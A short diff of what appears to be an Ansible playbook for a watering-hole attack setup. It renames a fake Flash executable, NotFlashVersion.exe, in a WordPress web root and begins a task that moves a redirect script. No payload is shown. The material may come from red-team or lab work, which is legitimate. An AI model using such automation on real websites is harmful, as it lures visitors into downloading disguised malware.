@@ -85,7 +85,7 @@
     chdir: /opt/watering_hole/
 
 - name: Rename NotFlashVersion.exe To NFVersion_5e.exe
-  command: mv /srv/www/wordpress/NotFlashVersion.exe /srv/www/wordpress/NFVersion_5e.exe
+  command: mv /srv/www/wordpress/NotFlashVersion.exe /srv/www/wordpress/NFVersion.exe
 
 - name: Move Redirect Java Script
   become: yes
